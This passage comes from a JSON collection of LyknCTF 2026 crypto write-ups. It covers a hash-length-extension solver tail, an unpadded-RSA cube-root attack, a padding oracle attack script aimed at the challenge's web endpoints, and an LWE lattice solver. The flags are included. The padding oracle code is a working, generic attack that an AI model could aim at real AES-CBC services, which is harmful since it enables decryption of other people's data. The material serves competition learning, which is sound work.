fresh dari server\r\n        raw_data = r.recvline().decode('utf-8').strip()\r\n        server_data = json.loads(raw_data)\r\n        \r\n        original_msg = server_data[\"message\"].encode()\r\n        original_token = server_data[\"token\"]\r\n        \r\n        # Hitung HLE\r\n        new_token, new_msg = hle_sha256(original_token, original_msg, append_data, secret_length)\r\n        \r\n        # Bentuk payload\r\n        payload = json.dumps({\r\n            \"msg\": new_msg.hex(),\r\n            \"tag\": new_token\r\n        }).encode()\r\n\r\n        # Kirim payload\r\n        r.recvuntil(b'> ')\r\n        r.sendline(payload)\r\n        \r\n        # Baca respons\r\n        response = r.recvall(timeout=2).decode('utf-8', errors='ignore').strip()\r\n        r.close()\r\n        \r\n        print(f\"\\n[+] Response Server:\\n{response}\")\r\n            \r\n    except Exception as e:\r\n        print(f\"[-] Gagal terkoneksi: {e}\")\r\n\r\nif __name__ == \"__main__\":\r\n    solve_hash_dash()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{d252dd0610d9402fb18addbcb970f67d}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-crypto-noisybroadcast",
    "title": "LYKNCTF 2026: Noisy Broadcast",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "LYKNCTF 2026 Writeup: Noisy Broadcast",
    "problemDescription": "The challenge presents us with three different RSA public keys $(n_1, e), (n_2, e), (n_3, e)$ where the public exponent $e = 3$ is small and the same across all three keys. The same secret message $m$ was encrypted under these three keys, producing three ciphertexts $c_1, c_2, c_3$.\n\nThe challenge description hints at a \"noisy communication channel\", meaning the ciphertexts we received have been altered slightly at the end (the least significant digits/bits). The challenge title and the structure strongly suggest an application of Håstad's Broadcast Attack, but with an added twist: we must deal with the noise.\n\nHowever, a closer inspection of the provided parameters reveals a massive vulnerability that allows us to bypass the intended, complex mathematical solution entirely.",
    "tools": [],
    "analysis": "Let's examine the provided data:\n\n$e = 3$\n\n$n_1, n_2, n_3$ are each approximately 309 digits long.\n\n$c_1, c_2, c_3$ are each exactly 289 digits long.\n\nIn a standard RSA encryption, $c \\equiv m^e \\pmod n$.",
    "solution": [
      {
        "title": "The Fatal Flaw:",
        "content": "Notice that the length of the ciphertexts ($c_i$) is significantly smaller than the length of the moduli ($n_i$). Specifically, $c_i < n_i$.\n\nBecause $m^3 < n$ for all three keys, the modulo reduction step mod n in the RSA encryption process effectively does nothing. The operation is simply:\n$c = m^3$\n\nThis is known as Unpadded RSA where the message is too small relative to the modulus.\n\nThe \"Noise\":\nThe description states the ciphertexts are noisy. If we look closely at $c_1, c_2,$ and $c_3$, they are identical for the first ~270 digits and only differ in the last ~20 digits.\n\nBecause $c = m^3$ and the noise only affects the least significant digits of this massive 289-digit number, the noise is mathematically insignificant when we calculate the cube root. The integer part of the cube root (which corresponds to our plaintext message $m$) will remain completely unaffected by this minor fluctuation at the end of the ciphertext."
      },
      {
        "title": "Solution",
        "content": "Because the modulo operation never triggered ($m^3 < n$) and the noise is insignificant to the integer cube root, we completely ignore $n_1, n_2, n_3$ and the variations between the ciphertexts.\n\nWe only need to take one of the ciphertexts (e.g., $c_1$) and calculate its integer cube root $\\lfloor\\sqrt[3]{c_1}\\rfloor$."
      },
      {
        "title": "Python Exploit Script",
        "content": "We can write a simple Python script using a binary search to find the exact integer cube root of $c_1$ and convert the resulting integer back into a string to reveal the flag. We don't need the Chinese Remainder Theorem (CRT) or Coppersmith's method/Kannan's embedding (as the flag format playfully suggests might be the intended hard path if the moduli were smaller).",
        "code": "import binascii\n\ndef solve():\n    # We only need one ciphertext. The noise at the end doesn't affect the integer cube root.\n    c1 = 258513173341110907855004634578328776675613337727374937778021308566776511394028586169719647601517686407530370600703671047834514223488817495300633613007122903215194800830817082508335094056353114537752319982589386027924378028160153097890317313131416661071211651623002925590879169419712047717\n    \n    print(\"[*] Calculating integer cube root via binary search...\")\n    \n    # Binary search for integer cube root\n    low = 1\n    high = c1\n    \n    while low <= high:\n        mid = (low + high) // 2\n        mid_cubed = mid**3\n        \n        if mid_cubed == c1:\n            m = mid\n            break\n        elif mid_cubed < c1:\n            low = mid + 1\n        else:\n            high = mid - 1\n            \n    # Since there is noise, we might not get an exact match.\n    # The 'high' variable will hold the floor of the cube root.\n    m = high \n    \n    print(\"[+] Extracted integer m.\")\n    \n    # Convert integer to hex, remove '0x', and pad if necessary\n    hex_m = hex(m)[2:]\n    if len(hex_m) % 2 != 0:\n        hex_m = '0' + hex_m\n        \n    try:\n        # Convert hex back to string\n        flag = binascii.unhexlify(hex_m).decode('utf-8', errors='ignore')\n        print(f\"[+] Flag: {flag}\")\n    except Exception as e:\n        print(f\"[-] Decode error: {e}\")\n\nif __name__ == \"__main__\":\n    solve()"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import binascii\r\n\r\ndef solve_noisy_broadcast():\r\n    # Kita cukup menggunakan c1. Noise di akhir tidak akan mengubah hasil integer cube root\r\n    c1 = 258513173341110907855004634578328776675613337727374937778021308566776511394028586169719647601517686407530370600703671047834514223488817495300633613007122903215194800830817082508335094056353114537752319982589386027924378028160153097890317313131416661071211651623002925590879169419712047717\r\n    \r\n    print(\"[*] Mengekstraksi akar pangkat 3 (Integer Cube Root)...\")\r\n    \r\n    # Binary search untuk mencari nilai m (akar pangkat 3 dari c1)\r\n    low = 1\r\n    high = c1\r\n    while low <= high:\r\n        mid = (low + high) // 2\r\n        mid3 = mid**3\r\n        if mid3 == c1:\r\n            m = mid\r\n            break\r\n        elif mid3 < c1:\r\n            low = mid + 1\r\n        else:\r\n            high = mid - 1\r\n            \r\n    m = high # Mengambil batas bawah floor(cbrt(c1)) karena noise\r\n    \r\n    # Proses konversi dari Integer ke Teks (Flag)\r\n    hex_m = hex(m)[2:]\r\n    if len(hex_m) % 2 != 0:\r\n        hex_m = '0' + hex_m\r\n        \r\n    try:\r\n        flag = binascii.unhexlify(hex_m).decode('utf-8', errors='ignore')\r\n        print(\"\\n[+] Flag berhasil ditemukan:\")\r\n        print(flag)\r\n    except Exception as e:\r\n        print(f\"[-] Gagal men-decode flag: {e}\")\r\n\r\nif __name__ == \"__main__\":\r\n    solve_noisy_broadcast()"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{n01sy_CRT_w1th_K4nn4n_3mb3dd1ng}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-crypto-postbox",
    "title": "LYKNCTF 2026: Postbox",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "LYKNCTF 2026 Writeup: Postbox",
    "problemDescription": "In this challenge, we are presented with a small login service via a web application.\nInteracting with the endpoints reveals the following:\n\nGET /login: Returns an encrypted session token formatted as JSON, containing an iv and a ciphertext.\n\nPOST /decrypt: Allows us to submit a JSON payload with iv and ciphertext to be decrypted by the server.\n\nThe /login endpoint gives a helpful note:\n\"AES-128-CBC token. POST manipulated (iv, ciphertext) to /decrypt to learn if the padding is valid.\"",
    "tools": [],
    "analysis": "The challenge explicitly invites us to perform a Padding Oracle Attack.\n\nThe system uses AES-128 in Cipher Block Chaining (CBC) mode. In CBC mode, the decryption of a block $C_i$ involves decrypting it with the block cipher (AES) and then XORing the result with the previous ciphertext block $C_{i-1}$ (or the IV for the first block) to get the plaintext $P_i$.\n\nBecause AES is a block cipher (16 bytes per block), messages must be padded to a multiple of 16 bytes. The standard padding is PKCS#7, where the value of each added byte is the number of bytes added (e.g., 0x01 or 0x02 0x02).\n\nThe vulnerability lies in the /decrypt endpoint. When we submit a modified ciphertext, the server decrypts it. If the resulting plaintext does not end with a valid PKCS#7 padding, the server returns a specific error ({\"error\": \"bad padding\"}). If the padding is valid, it processes it differently or doesn't throw that specific error. This binary response acts as an \"Oracle\", allowing us to deduce the intermediate state of the decryption, byte by byte, without ever knowing the secret key.",
    "solution": [
      {
        "title": "Exploitation Challenges",
        "content": "While a standard Padding Oracle attack works in theory, applying it to a real remote server introduced a few hurdles:\n\nRate Limiting & Connection Drops: Sending thousands of requests rapidly caused the server to drop connections. We bypassed this by implementing a try-except block to catch requests.exceptions.RequestException and added a slight delay (time.sleep(0.5)) to seamlessly retry failed requests.\n\nFalse Positives: When guessing a padding of 0x01, we might accidentally form a valid padding of 0x02 0x02 if the preceding byte coincidentally matches. We implemented a secondary check to alter the preceding byte (manipulated_prev[byte_idx - 1] ^= 0x01); if the padding remains valid, it's a true 0x01.\n\nMessage Integrity: Modifying the IV only corrupts the first block. To correctly attack the padding (which is at the end of the ciphertext), we must modify the block immediately preceding the block we are currently decrypting, and submit the entire sequence up to that point."
      },
      {
        "title": "Solution (Exploit Script)",
        "content": "Below is the robust, pure-Python script used to extract the flag block by block.",
        "code": "import requests\nimport sys\nimport time\n\nURL = \"http://4a67951d-ff21-4e13-9415-917ec4bdb06d.51.79.140.18.nip.io:8080\"\ns = requests.Session() # Use session for connection pooling/speed\n\ndef get_challenge_data():\n    r = s.get(f\"{URL}/login\")\n    data = r.json()\n    return bytes.fromhex(data['iv']), bytes.fromhex(data['ciphertext'])\n\ndef is_padding_valid(iv, ct):\n    while True:\n        try:\n            r = s.post(f\"{URL}/decrypt\", json={\"iv\": iv.hex(), \"ciphertext\": ct.hex()}, timeout=5)\n            # If the server doesn't complain about padding, our guess is correct\n            return \"bad padding\" not in r.text\n        except requests.exceptions.RequestException:\n            # Handle rate limiting/dropped connections\n            time.sleep(0.5)\n\ndef padding_oracle_decrypt(iv, ciphertext):\n    blocks = [iv] + [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]\n    plaintext = b\"\"\n\n    for block_idx in range(1, len(blocks)):\n        prev_block = blocks[block_idx - 1]\n        curr_block = blocks[block_idx]\n        \n        intermediate = bytearray(16)\n        block_decrypted = bytearray(16)\n        \n        for pad_val in range(1, 17):\n            byte_idx = 16 - pad_val\n            \n            found = False\n            for guess in range(256):\n                manipulated_prev = bytearray(prev_block)\n                \n                # Setup known padding bytes\n                for i in range(byte_idx + 1, 16):\n                    manipulated_prev[i] = intermediate[i] ^ pad_val\n                    \n                # Inject our guess\n                manipulated_prev[byte_idx] = guess ^ pad_val\n                \n                # Construct the payload up to the current block\n                test_iv = blocks[0] if block_idx > 1 else manipulated_prev\n                test_ct = b\"\"\n                if block_idx > 1:\n                    for i in range(1, block_idx - 1):\n                        test_ct += blocks[i]\n                    test_ct += manipulated_prev\n                    test_ct += curr_block\n                else:\n                    test_ct = curr_block\n\n                if is_padding_valid(test_iv, test_ct):\n                    # Mitigate False Positives for pad_val == 1\n                    if pad_val == 1:\n                        manipulated_prev[byte_idx - 1] ^= 0x01\n                        \n                        test_iv_fp = blocks[0] if block_idx > 1 else manipulated_prev\n                        test_ct_fp = b\"\"\n                        if block_idx > 1:\n                            for i in range(1, block_idx - 1):\n                                test_ct_fp += blocks[i]\n                            test_ct_fp += manipulated_prev\n                            test_ct_fp += curr_block\n                        else:\n                            test_ct_fp = curr_block\n\n                        if not is_padding_valid(test_iv_fp, test_ct_fp):\n                            continue \n                            \n                    # Successfully found the intermediate byte\n                    intermediate[byte_idx] = guess \n                    block_decrypted[byte_idx] = prev_block[byte_idx] ^ intermediate[byte_idx]\n                    found = True\n                    break\n                    \n        plaintext += block_decrypted\n        print(f\"[*] Recovered so far: {plaintext}\")\n\n    return plaintext\n\nif __name__ == \"__main__\":\n    iv, ciphertext = get_challenge_data()\n    result = padding_oracle_decrypt(iv, ciphertext)\n    print(f\"\\n[+] Full Decrypted Data: {result}\")"
      },
      {
        "title": "Results",
        "content": "Executing the script successfully decoded the ciphertext block by block:\n\n[*] Mendekripsi Blok 1...\n[*] Plaintext Sementara: b'session: user=gu'\n...\n[*] Mendekripsi Blok 2...\n[*] Plaintext Sementara: b'session: user=guest; role=viewer'\n...\n[*] Mendekripsi Blok 3...\n[*] Plaintext Sementara: b'session: user=guest; role=viewer; flag=LYKNCTF{5'\n...\n[*] Mendekripsi Blok 4...\n[*] Plaintext Sementara: b'session: user=guest; role=viewer; flag=LYKNCTF{5c6545ebb3914a988'\n...\n[*] Mendekripsi Blok 5...\n[*] Plaintext Sementara: b'session: user=guest; role=viewer; flag=LYKNCTF{5c6545ebb3914a988de14d416fbc8c0c}'\n\n\nThe flag is safely extracted from the session data!"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import requests\r\nimport sys\r\nimport time\r\n\r\nURL = \"http://ffaf7181-d7f5-481d-a8b8-0edf903c28e1.51.79.140.18.nip.io:8080\"\r\ns = requests.Session()\r\n\r\ndef get_challenge_data():\r\n    print(\"[*] Meminta token baru dari /login...\")\r\n    r = s.get(f\"{URL}/login\")\r\n    data = r.json()\r\n    return bytes.fromhex(data['iv']), bytes.fromhex(data['ciphertext'])\r\n\r\ndef is_padding_valid(iv, ct):\r\n    while True:\r\n        try:\r\n            r = s.post(f\"{URL}/decrypt\", json={\"iv\": iv.hex(), \"ciphertext\": ct.hex()}, timeout=5)\r\n            return \"bad padding\" not in r.text\r\n        except requests.exceptions.RequestException:\r\n            time.sleep(0.5)\r\n\r\ndef padding_oracle_decrypt(iv, ciphertext):\r\n    blocks = [iv] + [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]\r\n    plaintext = b\"\"\r\n\r\n    print(f\"[*] Total blok yang akan didekripsi: {len(blocks) - 1}\")\r\n\r\n    for block_idx in range(1, len(blocks)):\r\n        prev_block = blocks[block_idx - 1]\r\n        curr_block = blocks[block_idx]\r\n        \r\n        intermediate = bytearray(16)\r\n        block_decrypted = bytearray(16)\r\n        \r\n        print(f\"\\n[*] Mendekripsi Blok {block_idx}...\")\r\n        \r\n        for pad_val in range(1, 17):\r\n            byte_idx = 16 - pad_val\r\n            \r\n            found = False\r\n            for guess in range(256):\r\n                manipulated_prev = bytearray(prev_block)\r\n                \r\n                for i in range(byte_idx + 1, 16):\r\n                    manipulated_prev[i] = intermediate[i] ^ pad_val\r\n                    \r\n                manipulated_prev[byte_idx] = guess ^ pad_val\r\n                \r\n                test_iv = blocks[0] if block_idx > 1 else manipulated_prev\r\n                test_ct = b\"\"\r\n                if block_idx > 1:\r\n                    for i in range(1, block_idx - 1):\r\n                        test_ct += blocks[i]\r\n                    test_ct += manipulated_prev\r\n                    test_ct += curr_block\r\n                else:\r\n                    test_ct = curr_block\r\n\r\n                if is_padding_valid(test_iv, test_ct):\r\n                    if pad_val == 1:\r\n                        manipulated_prev[byte_idx - 1] ^= 0x01\r\n                        \r\n                        test_iv_fp = blocks[0] if block_idx > 1 else manipulated_prev\r\n                        test_ct_fp = b\"\"\r\n                        if block_idx > 1:\r\n                            for i in range(1, block_idx - 1):\r\n                                test_ct_fp += blocks[i]\r\n                            test_ct_fp += manipulated_prev\r\n                            test_ct_fp += curr_block\r\n                        else:\r\n                            test_ct_fp = curr_block\r\n\r\n                        if not is_padding_valid(test_iv_fp, test_ct_fp):\r\n                            continue \r\n                            \r\n                    # --- PERBAIKAN FATAL ADA DI SINI ---\r\n                    # Hapus ^ pad_val. Guess sudah merupakan intermediate murni!\r\n                    intermediate[byte_idx] = guess \r\n                    block_decrypted[byte_idx] = prev_block[byte_idx] ^ intermediate[byte_idx]\r\n                    \r\n                    char_repr = chr(block_decrypted[byte_idx]) if 32 <= block_decrypted[byte_idx] <= 126 else \".\"\r\n                    print(f\"    [+] Byte {byte_idx:02d}: {char_repr!r} (hex: {block_decrypted[byte_idx]:02x})\")\r\n                    found = True\r\n                    break\r\n                    \r\n            if not found:\r\n                print(f\"    [-] Gagal menemukan byte di index {byte_idx}\")\r\n                break\r\n                \r\n        plaintext += block_decrypted\r\n        print(f\"[*] Plaintext Sementara: {plaintext}\")\r\n\r\n    return plaintext\r\n\r\nif __name__ == \"__main__\":\r\n    print(\"[*] Memulai serangan Padding Oracle Tahan Banting...\")\r\n    iv, ciphertext = get_challenge_data()\r\n    \r\n    print(f\"[*] IV         : {iv.hex()}\")\r\n    print(f\"[*] Ciphertext : {ciphertext.hex()}\\n\")\r\n    \r\n    result = padding_oracle_decrypt(iv, ciphertext)\r\n    \r\n    print(\"\\n\" + \"=\"*50)\r\n    print(\"[+] DEKRIPSI SELESAI!\")\r\n    \r\n    try:\r\n        pad_len = result[-1]\r\n        if 1 <= pad_len <= 16:\r\n            unpadded = result[:-pad_len]\r\n            print(f\"\\n[+] Flag / Data : {unpadded.decode('utf-8', errors='ignore')}\")\r\n        else:\r\n            print(f\"\\n[+] Flag / Data : {result.decode('utf-8', errors='ignore')}\")\r\n    except Exception:\r\n        print(f\"\\n[+] Raw Data    : {result}\")\r\n        \r\n    print(\"=\"*50)"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{5c6545ebb3914a988de14d416fbc8c0c}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-crypto-replay-jasmine",
    "title": "Replay-Jasmine?",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "- **Category:** Crypto\n- **CTF:** LYKN CTF\n- **Difficulty:** Hard\n- **Flag:** `LYKNCTF{Connect_The_World}`",
    "problemDescription": "`chall.json` berisi dua instance Learning With Errors berukuran kecil, parameter scrypt, dan ciphertext final. Secret dari kedua instance dapat dipulihkan sebagai masalah closest vector pada q-ary lattice. Kedua secret lalu dipack sebagai signed integer 32-bit little-endian, diproses dengan scrypt, dan dipakai sebagai master key untuk `Shiina256PIGE`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Struktur data",
        "content": "Bagian penting dari `chall.json`:\n\n| Field | Ukuran | Peran |\n|---|---:|---|\n| `Alcginlcgchall` | 32 x 20 | Matriks LWE pertama |\n| `donttimebabybob` | 32 | Sampel LWE pertama |\n| `timeforR` | 28 x 18 | Matriks LWE kedua |\n| `c` | 28 | Sampel LWE kedua |\n| `kdf` | object | Parameter scrypt |\n| `finally` | hex | Ciphertext `Shiina256PIGE` |\n\nNilai matriks pertama berada pada rentang `0..768`, sehingga modulusnya `q1 = 769`. Matriks kedua berada pada rentang `0..502`, sehingga modulusnya `q2 = 503`.\n\nKedua sistem mengikuti bentuk:\n\n\n\n`e` sangat kecil, sedangkan `s` juga memiliki koefisien kecil. Menyelesaikan sistem secara langsung modulo `q` tidak cukup karena noise membuat hasilnya tidak exact.",
        "code": "b = A*s + e mod q"
      },
      {
        "title": "Memulihkan secret dengan lattice",
        "content": "Untuk setiap instance, bentuk lattice:\n\n\n\nGenerator kolomnya:\n\n\n\n`b` berada sangat dekat dengan suatu titik lattice karena:\n\n\n\nDengan kata lain, titik lattice terdekat terhadap `b` adalah `b - e`.\n\nLangkah solver:\n\n1. Hitung Hermite Normal Form dari `G` untuk memperoleh basis lattice persegi.\n2. Transpose basis karena `fpylll` menggunakan row basis.\n3. Reduksi basis memakai LLL.\n4. Jalankan CVP untuk mencari titik lattice yang paling dekat dengan target.\n5. Hitung noise sebagai `e = b - closest`.\n6. Selesaikan `A*s = closest mod q` memakai eliminasi Gauss modular.\n7. Ubah setiap koefisien ke representasi centered modulo `q`.\n\nSecret yang didapat:\n\n\n\nValidasi residual menunjukkan:\n\n\n\nRentang sekecil ini memastikan hasil CVP benar, bukan sekadar solusi modular acak.",
        "code": "Λ = {A*x + q*z | x ∈ Z^n, z ∈ Z^m}"
      },
      {
        "title": "Membentuk password scrypt",
        "content": "Kedua secret digabung dan dipack sebagai signed `int32` little-endian:\n\n\n\nParameter dari JSON:\n\n\n\nMaster key yang dihasilkan:\n\n\n\n`p=4000` membuat pemanggilan scrypt biasa berjalan lama. Tahap ROMix untuk setiap blok `p` bersifat independen, jadi `solve.py` membaginya ke beberapa worker. Hasilnya tetap identik dengan RFC 7914:",
        "code": "coefficients = s1 + s2\npassword = struct.pack(f\"<{len(coefficients)}i\", *coefficients)"
      },
      {
        "title": "Dekripsi ciphertext",
        "content": "`_aux.py` mendefinisikan `Shiina256PIGE`. Format ciphertext:\n\n\n\nMaster key diturunkan lagi dengan HKDF-like HMAC-SHA512 menjadi encryption key, MAC key, forward IV, dan backward IV. Autentikasi tag juga menjadi validasi final bahwa secret dan serialisasi password sudah tepat.",
        "code": "nonce  = 96 byte\nbody   = kelipatan 64 byte\ntag    = HMAC-SHA512 64 byte"
      },
      {
        "title": "Output:",
        "content": "",
        "code": "LYKNCTF{Connect_The_World}"
      },
      {
        "title": "Menjalankan solver",
        "content": "Letakkan file berikut dalam satu folder:\n\n\n\nAktifkan environment dan pasang dependency:",
        "code": "chall.json\n_aux.py\nsolve.py"
      },
      {
        "title": "Jalankan:",
        "content": "Output akhir:",
        "code": "python3 solve.py chall.json --workers 4"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Solver for LYKN CTF - Replay-Jasmine?\r\n\r\nDependencies:\r\n    pip install sympy fpylll cysignals scrypt\r\n\r\nThe `scrypt` package is optional. When its private `_scrypt` extension is not\r\navailable, the solver falls back to hashlib.scrypt, which is considerably\r\nslower for p=4000.\r\n\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport ctypes\r\nimport hashlib\r\nimport importlib.util\r\nimport json\r\nimport multiprocessing as mp\r\nimport os\r\nimport struct\r\nimport sys\r\nfrom pathlib import Path\r\nfrom typing import Iterable, Sequence\r\n\r\nfrom fpylll import CVP, LLL, IntegerMatrix\r\nfrom sympy import Matrix\r\nfrom sympy.matrices.normalforms import hermite_normal_form\r\n\r\ntry:\r\n    from _aux import Shiina256PIGE\r\nexcept ImportError as exc:\r\n    raise SystemExit(\"[-] Put solve.py beside _aux.py\") from exc\r\n\r\n\r\ndef centered(value: int, modulus: int) -> int:\r\n    value %= modulus\r\n    return value - modulus if value > modulus // 2 else value\r\n\r\n\r\ndef solve_modular_system(\r\n    matrix: Sequence[Sequence[int]],\r\n    target: Sequence[int],\r\n    modulus: int,\r\n) -> list[int]:\r\n    \"\"\"Solve A*x = target (mod prime modulus) with modular Gaussian elimination.\"\"\"\r\n    rows = len(matrix)\r\n    cols = len(matrix[0])\r\n    aug = [\r\n        [int(matrix[i][j]) % modulus for j in range(cols)]\r\n        + [int(target[i]) % modulus]\r\n        for i in range(rows)\r\n    ]\r\n\r\n    pivot_row = 0\r\n    pivots: list[int] = []\r\n\r\n    for col in range(cols):\r\n        pivot = next(\r\n            (row for row in range(pivot_row, rows) if aug[row][col] % modulus),\r\n            None,\r\n        )\r\n        if pivot is None:\r\n            continue\r\n\r\n        aug[pivot_row], aug[pivot] = aug[pivot], aug[pivot_row]\r\n        inv = pow(aug[pivot_row][col], -1, modulus)\r\n        aug[pivot_row] = [(value * inv) % modulus for value in aug[pivot_row]]\r\n\r\n        for row in range(rows):\r\n            if row == pivot_row:\r\n                continue\r\n            factor = aug[row][col] % modulus\r\n            if factor:\r\n                aug[row] = [\r\n                    (aug[row][j] - factor * aug[pivot_row][j]) % modulus\r\n                    for j in range(cols + 1)\r\n                ]\r\n\r\n        pivots.append(col)\r\n        pivot_row += 1\r\n        if pivot_row == rows:\r\n            break\r\n\r\n    if len(pivots) != cols:\r\n        raise ValueError(f\"matrix rank is {len(pivots)}, expected {cols}\")\r\n\r\n    solution = [0] * cols\r\n    for row, col in enumerate(pivots):\r\n        solution[col] = aug[row][-1]\r\n    return solution\r\n\r\n\r\ndef recover_lwe_secret(\r\n    matrix: Sequence[Sequence[int]],\r\n    target: Sequence[int],\r\n    modulus: int,\r\n) -> tuple[list[int], list[int]]:\r\n    \"\"\"Recover a small LWE secret through a q-ary lattice CVP attack.\"\"\"\r\n    a = Matrix(matrix)\r\n    b = [int(value) for value in target]\r\n    rows, cols = a.shape\r\n\r\n    # Column lattice Λ = {A*s + q*z}.  HNF gives a square column basis.\r\n    generators = Matrix.hstack(modulus * Matrix.eye(rows), a)\r\n    column_basis = hermite_normal_form(generators)\r\n    row_basis = column_basis.T\r\n\r\n    lattice = IntegerMatrix.from_matrix(\r\n        [[int(row_basis[i, j]) for j in range(rows)] for i in range(rows)]\r\n    )\r\n    LLL.reduction(lattice, delta=0.99)\r\n\r\n    closest = list(CVP.closest_vector(lattice, b))\r\n    error = [b[i] - int(closest[i]) for i in range(rows)]\r\n\r\n    residues = solve_modular_system(matrix, closest, modulus)\r\n    secret = [centered(value, modulus) for value in residues]\r\n\r\n    # Independent validation against the original samples.\r\n    checked_error = []\r\n    for i in range(rows):\r\n        residue = (\r\n            b[i]\r\n            - sum(int(matrix[i][j]) * secret[j] for j in range(cols))\r\n        ) % modulus\r\n        checked_error.append(centered(residue, modulus))\r\n\r\n    if checked_error != error:\r\n        raise ValueError(\"CVP result failed the LWE residual check\")\r\n\r\n    return secret, error\r\n\r\n\r\n# Globals initialized in each multiprocessing worker.\r\n_SCRYPT_LIB = None\r\n_SMIX = None\r\n_LIBC = None\r\n_V = None\r\n_XY = None\r\n_SCRYPT_N = 0\r\n_SCRYPT_R = 0\r\n\r\n\r\ndef _aligned_alloc(size: int, alignment: int = 64) -> ctypes.c_void_p:\r\n    pointer = ctypes.c_void_p()\r\n    result = _LIBC.posix_memalign(ctypes.byref(pointer), alignment, size)\r\n    if result:\r\n        raise OSError(result, \"posix_memalign failed\")\r\n    return pointer\r\n\r\n\r\ndef _init_scrypt_worker(n: int, r: int, extension_path: str) -> None:\r\n    global _SCRYPT_LIB, _SMIX, _LIBC, _V, _XY, _SCRYPT_N, _SCRYPT_R\r\n\r\n    _SCRYPT_N = n\r\n    _SCRYPT_R = r\r\n    _SCRYPT_LIB = ctypes.CDLL(extension_path)\r\n    _SMIX = _SCRYPT_LIB.crypto_scrypt_smix\r\n    _SMIX.argtypes = [\r\n        ctypes.c_void_p,\r\n        ctypes.c_size_t,\r\n        ctypes.c_uint64,\r\n        ctypes.c_void_p,\r\n        ctypes.c_void_p,\r\n    ]\r\n    _SMIX.restype = None\r\n\r\n    _LIBC = ctypes.CDLL(None)\r\n    _LIBC.posix_memalign.argtypes = [\r\n        ctypes.POINTER(ctypes.c_void_p),\r\n        ctypes.c_size_t,\r\n        ctypes.c_size_t,\r\n    ]\r\n    _LIBC.posix_memalign.restype = ctypes.c_int\r\n    _LIBC.free.argtypes = [ctypes.c_void_p]\r\n    _LIBC.free.restype = None\r\n\r\n    block_size = 128 * r\r\n    _V = _aligned_alloc(n * block_size)\r\n    _XY = _aligned_alloc(256 * r + 64)\r\n\r\n\r\ndef _romix_block(item: tuple[int, bytes]) -> tuple[int, bytes]:\r\n    index, block = item\r\n    pointer = _aligned_alloc(len(block))\r\n    try:\r\n        ctypes.memmove(pointer, block, len(block))\r\n        _SMIX(pointer, _SCRYPT_R, _SCRYPT_N, _V, _XY)\r\n        return index, ctypes.string_at(pointer, len(block))\r\n    finally:\r\n        _LIBC.free(pointer)\r\n\r\n\r\ndef parallel_scrypt(\r\n    password: bytes,\r\n    salt: bytes,\r\n    n: int,\r\n    r: int,\r\n    p: int,\r\n    dklen: int,\r\n    workers: int,\r\n) -> bytes:\r\n    \"\"\"RFC 7914 scrypt with independent ROMix blocks distributed to workers.\"\"\"\r\n    spec = importlib.util.find_spec(\"_scrypt\")\r\n    if spec is None or not spec.origin:\r\n        print(\"[!] _scrypt extension unavailable; using slower hashlib.scrypt\")\r\n        return hashlib.scrypt(\r\n            password,\r\n            salt=salt,\r\n            n=n,\r\n            r=r,\r\n            p=p,\r\n            dklen=dklen,\r\n            maxmem=2**31 - 1,\r\n        )\r\n\r\n    block_size = 128 * r\r\n    initial = hashlib.pbkdf2_hmac(\r\n        \"sha256\", password, salt, 1, dklen=p * block_size\r\n    )\r\n    items = (\r\n        (index, initial[index * block_size : (index + 1) * block_size])\r\n        for index in range(p)\r\n    )\r\n\r\n    workers = max(1, min(workers, p, os.cpu_count() or 1))\r\n    context = mp.get_context(\"fork\")\r\n    chunksize = max(1, p // (workers * 8))\r\n\r\n    with context.Pool(\r\n        workers,\r\n        initializer=_init_scrypt_worker,\r\n        initargs=(n, r, spec.origin),\r\n    ) as pool:\r\n        mixed = list(pool.imap_unordered(_romix_block, items, chunksize=chunksize))\r\n\r\n    mixed.sort(key=lambda pair: pair[0])\r\n    final_blocks = b\"\".join(block for _, block in mixed)\r\n    return hashlib.pbkdf2_hmac(\r\n        \"sha256\", password, final_blocks, 1, dklen=dklen\r\n    )\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"challenge\", nargs=\"?\", default=\"chall.json\")\r\n    parser.add_argument(\"--workers\", type=int, default=4)\r\n    args = parser.parse_args()\r\n\r\n    challenge_path = Path(args.challenge)\r\n    data = json.loads(challenge_path.read_text())\r\n\r\n    secret_1, error_1 = recover_lwe_secret(\r\n        data[\"Alcginlcgchall\"], data[\"donttimebabybob\"], 769\r\n    )\r\n    secret_2, error_2 = recover_lwe_secret(data[\"timeforR\"], data[\"c\"], 503)\r\n\r\n    print(f\"[+] secret 1: {secret_1}\")\r\n    print(f\"[+] error 1 range: [{min(error_1)}, {max(error_1)}]\")\r\n    print(f\"[+] secret 2: {secret_2}\")\r\n    print(f\"[+] error 2 range: [{min(error_2)}, {max(error_2)}]\")\r\n\r\n    all_coefficients = secret_1 + secret_2\r\n    password = struct.pack(f\"<{len(all_coefficients)}i\", *all_coefficients)\r\n\r\n    kdf = data[\"kdf\"]\r\n    salt = bytes.fromhex(kdf[\"eww_too_salty\"])\r\n    master_key = parallel_scrypt(\r\n        password=password,\r\n        salt=salt,\r\n        